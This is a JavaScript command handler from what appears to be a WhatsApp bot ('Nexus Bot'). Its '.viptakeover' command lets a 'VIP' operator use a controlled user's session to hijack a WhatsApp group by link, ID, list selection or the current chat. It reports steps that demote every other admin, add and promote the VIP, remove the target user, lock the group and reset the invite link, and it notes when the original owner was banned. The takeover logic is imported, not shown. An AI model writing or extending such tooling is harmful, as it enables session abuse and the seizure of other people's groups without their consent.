import { VIPQueries } from "../../database/query.js"
import { VIPHelper, VIPTakeover } from "../../whatsapp/index.js"

export default {
  name: "VIP Takeover",
  description: "Takeover a group using controlled user's session",
  commands: ["viptakeover", "vipattack"],
  category: "vipmenu",
  usage: 
    "• `.viptakeover <number>` - Takeover by selection (reply to vipgroups message)\n" +
    "• `.viptakeover <link> <phone>` - Takeover by group link\n" +
    "• `.viptakeover <group_id@g.us> <phone>` - Takeover by group ID\n" +
    "• `.viptakeover <phone>` - Takeover current group (when used in a group)",
  permissions: {
  ownerAndVip: true,
  privateOnly: true
},
  async execute(sock, sessionId, args, m) {
    try {
      const vipTelegramId = VIPHelper.fromSessionId(sessionId)
      
      if (!vipTelegramId) {
        await sock.sendMessage(m.chat, { text: "❌ Could not identify your session\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const vipStatus = await VIPQueries.isVIP(vipTelegramId)
      
      if (!vipStatus.isVIP) {
        await sock.sendMessage(m.chat, { text: "❌ You don't have VIP access.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      // Get VIP's phone number
      const vipSock = await VIPHelper.getVIPSocket(vipTelegramId)
      if (!vipSock) {
        await sock.sendMessage(m.chat, { text: "❌ Your session is not available.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }
      const vipPhone = VIPHelper.extractPhone(vipSock.user.id)

      // METHOD 1: Reply to vipgroups message with number
      if (m.quoted && args.length === 1 && /^\d+$/.test(args[0])) {
        return await this.takeoverBySelection(sock, m, vipTelegramId, vipPhone, parseInt(args[0]))
      }

      // METHOD 2: Direct group link with phone
      if (args.length === 2 && args[0].includes('chat.whatsapp.com')) {
        const groupLink = args[0]
        const targetPhone = args[1].replace(/[@\s\-+]/g, '')
        return await this.takeoverByLink(sock, m, vipTelegramId, vipPhone, groupLink, targetPhone)
      }

      // METHOD 3: Direct Group ID with phone
      if (args.length === 2 && args[0].endsWith('@g.us')) {
        const groupJid = args[0]
        const targetPhone = args[1].replace(/[@\s\-+]/g, '')
        return await this.takeoverByGroupId(sock, m, vipTelegramId, vipPhone, groupJid, targetPhone)
      }

      // METHOD 4: Current group takeover
      if (m.isGroup && args.length === 1) {
        const targetPhone = args[0].replace(/[@\s\-+]/g, '')
        return await this.takeoverCurrentGroup(sock, m, vipTelegramId, vipPhone, targetPhone)
      }

      // Invalid usage
      await sock.sendMessage(m.chat, { 
        text: "❌ *Invalid Usage*\n\n" +
          "*Method 1: Select from list*\n" +
          "1. Use `.vipgroups <phone>`\n" +
          "2. Reply with `.viptakeover <number>`\n\n" +
          "*Method 2: Direct link*\n" +
          "`.viptakeover <group_link> <phone>`\n\n" +
          "*Method 3: Direct Group ID*\n" +
          "`.viptakeover <group_id@g.us> <phone>`\n\n" +
          "*Method 4: Current group*\n" +
          "(In a group) `.viptakeover <phone>`" + `

> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

    } catch (error) {
      console.error("[VIPTakeoverCmd] Execute error:", error)
      await sock.sendMessage(m.chat, { 
        text: "❌ Error during takeover operation.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
      }, { quoted: m })
    }
  },

  async takeoverBySelection(sock, m, vipTelegramId, vipPhone, groupNumber) {
    try {
      global.vipGroupsCache = global.vipGroupsCache || new Map()
      
      if (!m.quoted || !m.quoted.key || !m.quoted.key.id) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Please reply to the groups list message.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return
      }
      
      const quotedKey = m.quoted.key.id
      const cachedData = global.vipGroupsCache.get(quotedKey)

      if (!cachedData) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Groups list expired or not found.\n\nPlease use `.vipgroups <phone>` again.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return
      }

      const { groups, targetPhone, targetTelegramId } = cachedData

      if (groupNumber < 1 || groupNumber > groups.length) {
        await sock.sendMessage(m.chat, { 
          text: `❌ Invalid group number. Please choose between 1 and ${groups.length}.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      const selectedGroup = groups[groupNumber - 1]

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `📋 Group: ${selectedGroup.name}\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...

> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      const result = await VIPTakeover.takeover(
        vipTelegramId,
        targetTelegramId,
        selectedGroup.jid,
        vipPhone
      )

      await this.sendTakeoverResult(sock, m, result, selectedGroup.name)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Selection error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during takeover: ${errorMsg}

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })
    }
  },

  async takeoverByLink(sock, m, vipTelegramId, vipPhone, groupLink, targetPhone) {
    try {
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      
      if (!canControl.allowed) {
        await sock.sendMessage(m.chat, { 
          text: "❌ You do not have permission to control this user.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return
      }

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `🔗 Group Link: ${groupLink}\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...

> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      const result = await VIPTakeover.takeoverByLink(
        vipTelegramId,
        targetTelegramId,
        groupLink,
        vipPhone
      )

      await this.sendTakeoverResult(sock, m, result)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Link error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during takeover by link: ${errorMsg}

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })
    }
  },

  async takeoverByGroupId(sock, m, vipTelegramId, vipPhone, groupJid, targetPhone) {
    try {
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      
      if (!canControl.allowed) {
        await sock.sendMessage(m.chat, { 
          text: "❌ You do not have permission to control this user.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return
      }

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `🆔 Group ID: ${groupJid}\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...

> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      const result = await VIPTakeover.takeoverByGroupId(
        vipTelegramId,
        targetTelegramId,
        groupJid,
        vipPhone
      )

      await this.sendTakeoverResult(sock, m, result)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Group ID error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during takeover by group ID: ${errorMsg}

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })
    }
  },

  async takeoverCurrentGroup(sock, m, vipTelegramId, vipPhone, targetPhone) {
    try {
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id
      const groupJid = m.chat
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      
      if (!canControl.allowed) {
        await sock.sendMessage(m.chat, { 
          text: "❌ You do not have permission to control this user.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return
      }

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `📋 Group: Current Group\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...

> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      const result = await VIPTakeover.takeover(
        vipTelegramId,
        targetTelegramId,
        groupJid,
        vipPhone
      )

      await this.sendTakeoverResult(sock, m, result)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Current group error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during current group takeover: ${errorMsg}

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })
    }
  },

  async sendTakeoverResult(sock, m, result, groupName = null) {
    if (result.success) {
      let successMsg = `✅ *Takeover Successful!*\n\n`
      
      if (groupName) {
        successMsg += `📋 Group: ${groupName}\n\n`
      }
      
successMsg += `*Steps Completed:*\n` +
  `${result.steps.demotedAdmins ? '✅' : '❌'} Removed other admins\n` +
  `${result.steps.addedVIP ? '✅' : '❌'} Added VIP to group\n` +
  `${result.steps.promotedVIP ? '✅' : '❌'} Promoted VIP to admin\n` +
  `${result.steps.removedUser ? '✅' : '❌'} Removed target user\n` +
  `${result.steps.lockedGroup ? '✅' : '❌'} Locked group\n` +
  `${result.steps.resetGroupLink ? '✅' : '❌'} Reset group link\n\n`
      
      if (result.ownerWasBanned) {
        successMsg += `⚠️ *Note:* Original owner was banned\n\n`
      }
      
      successMsg += `🎉 You are now the sole admin!`
      
      await sock.sendMessage(m.chat, { text: successMsg }, { quoted: m })
      
    } else {
      let errorMessage = '❌ *Takeover Failed*\n\n'
      
      if (result.error) {
        errorMessage += `*Error:* ${result.error}\n\n`
      } else if (result.errors && Array.isArray(result.errors) && result.errors.length > 0) {
        const validErrors = result.errors.filter(e => e && e !== 'undefined' && String(e).trim() !== '')
        
        if (validErrors.length > 0) {
          errorMessage += `*Errors:*\n${validErrors.map(e => `• ${e}`).join('\n')}\n\n`
        } else {
          errorMessage += '*Error:* Operation failed without specific details\n\n'
        }
      } else {
        errorMessage += '*Error:* Operation failed\n\n'
      }
      
if (result.steps) {
  errorMessage += `*Steps Status:*\n` +
    `${result.steps.validation ? '✅' : '❌'} Validation\n` +
    `${result.steps.checkedPermissions ? '✅' : '❌'} Permission check\n` +
    `${result.steps.demotedAdmins ? '✅' : '❌'} Remove admins\n` +
    `${result.steps.addedVIP ? '✅' : '❌'} Add VIP\n` +
    `${result.steps.promotedVIP ? '✅' : '❌'} Promote VIP\n` +
    `${result.steps.removedUser ? '✅' : '❌'} Remove user\n` +
    `${result.steps.lockedGroup ? '✅' : '❌'} Lock group\n` +
    `${result.steps.resetGroupLink ? '✅' : '❌'} Reset group link`
}
      
      await sock.sendMessage(m.chat, { text: errorMessage }, { quoted: m })
    }
  }
}